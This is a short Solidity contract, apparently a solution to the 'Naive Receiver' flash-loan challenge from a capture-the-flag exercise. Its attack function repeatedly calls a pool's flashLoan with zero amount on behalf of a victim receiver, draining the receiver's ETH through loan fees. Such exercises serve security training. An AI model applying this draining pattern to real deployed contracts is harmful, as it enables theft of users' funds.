// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

contract Attacker {
    function attack(
        NaiveReceiverLenderPool pool,
        FlashLoanReceiver receiver
    ) external {
        address ETH = pool.ETH();
        
        while(address(receiver).balance != 0) {
            pool.flashLoan(receiver, ETH, 0 ether, "0x");
        }
    }
}
